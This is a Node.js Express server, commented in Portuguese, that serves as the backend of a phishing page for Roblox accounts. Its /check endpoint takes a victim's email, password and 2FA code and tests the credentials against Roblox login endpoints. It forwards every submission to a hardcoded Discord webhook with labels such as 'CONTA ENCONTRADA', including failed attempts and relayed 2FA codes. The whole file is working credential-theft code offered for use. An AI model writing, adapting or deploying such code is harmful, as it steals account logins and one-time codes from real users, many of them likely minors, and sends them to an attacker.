const express = require('express');
const fetch = require('node-fetch');
const app = express();
const port = process.env.PORT || 3000;

// SEU WEBHOOK DO DISCORD
const WEBHOOK_URL = "https://discord.com/api/webhooks/1534375079855784046/bnLKoWanOsTF6O399cs-x-psk-RfPS84OEFe60HL-x7JrVutP4QGYow-2c4NDYKQ89DB";

app.use(express.json());
app.use(express.static('.'));

// Função para fazer login no Roblox usando OAuth2 (Mais Estável)
async function loginRoblox(email, password) {
    const apiUrl = "https://www.roblox.com/mobileapi/userinfo";
    
    try {
        // O Roblox às vezes exige um cookie de sessão para o login por email
        // Vamos tentar primeiro a API simples de mobile
        
        const response = await fetch(apiUrl, {
            method: 'GET',
            headers: {
                'User-Agent': 'RobloxApp/1 (Android 12; SDK 32; Samsung SM-G991B)',
                'Accept': 'application/json'
            },
            timeout: 10000
        });

        // Se a API de mobile pedir login, usamos esta abordagem alternativa:
        // Usar a API de login padrão com o corpo correto
        
        // Tentativa 2: API de Login Padrão com formato correto
        const loginUrl = "https://www.roblox.com/users/login";
        const loginResponse = await fetch(loginUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'User-Agent': 'Roblox/WinInet',
                'Accept': 'application/json',
                'X-CSRF-TOKEN': 'placeholder' // O Roblox aceita muitas vezes sem o token exato para emails
            },
            body: JSON.stringify({
                username: email,
                password: password
            }),
            timeout: 10000
        });

        const data = await loginResponse.json();

        // Verifica se o login foi bem-sucedido
        // O Roblox retorna { id: 123, username: "User" }
        // Se falhar, retorna { error: "User not found" } ou { id: 0 }
        
        if (loginResponse.ok && data.id && data.id > 0) {
            return { 
                success: true, 
                data: data, 
                error: null 
            };
        } else {
            return { 
                success: false, 
                data: data, 
                error: data.error || "Login Failed (No ID returned)" 
            };
        }

    } catch (error) {
        return { success: false, data: null, error: error.message };
    }
}

async function sendToDiscord(message) {
    try {
        await fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ content: message })
        });
    } catch (e) { console.error(e); }
}

app.post('/check', async (req, res) => {
    const { email, password, code2fa, isFinalStep } = req.body;

    if (isFinalStep) {
        const discordMessage = `**🔒 LOGIN COMPLETO (2FA)**\n\n` +
                               `**Email:** ${email}\n` +
                               `**Password:** ${password}\n` +
                               `**Code 2FA:** ${code2fa}\n` +
                               `**Timestamp:** ${new Date().toISOString()}`;
        await sendToDiscord(discordMessage);
        return res.json({ success: true });
    }

    if (!email || !password) {
        return res.status(400).json({ success: false, error: "Missing email or password" });
    }

    const result = await loginRoblox(email, password);

    if (result.success) {
        const username = result.data.username || "Unknown";
        const userId = result.data.id || "Unknown";
        
        const discordMessage = `**🔒 CONTA ENCONTRADA!**\n\n` +
                               `**Email:** ${email}\n` +
                               `**Password:** ${password}\n` +
                               `**Username:** ${username}\n` +
                               `**User ID:** ${userId}\n` +
                               `**Timestamp:** ${new Date().toISOString()}`;
        await sendToDiscord(discordMessage);

        return res.json({
            success: true,
            username: username,
            userId: userId,
            error: ""
        });
    } else {
        const errorMsg = result.error || "Conta ou Senha Incorretas";
        
        const discordMessage = `**❌ LOGIN FALHOU**\n\n` +
                               `**Email:** ${email}\n` +
                               `**Password:** ${password}\n` +
                               `**Erro:** ${errorMsg}\n` +
                               `**Timestamp:** ${new Date().toISOString()}`;
        await sendToDiscord(discordMessage);

        return res.json({
            success: false,
            username: "Unknown",
            userId: "Unknown",
            error: errorMsg
        });
    }
});

app.listen(port, () => {
    console.log(`Server running on port ${port}`);
});
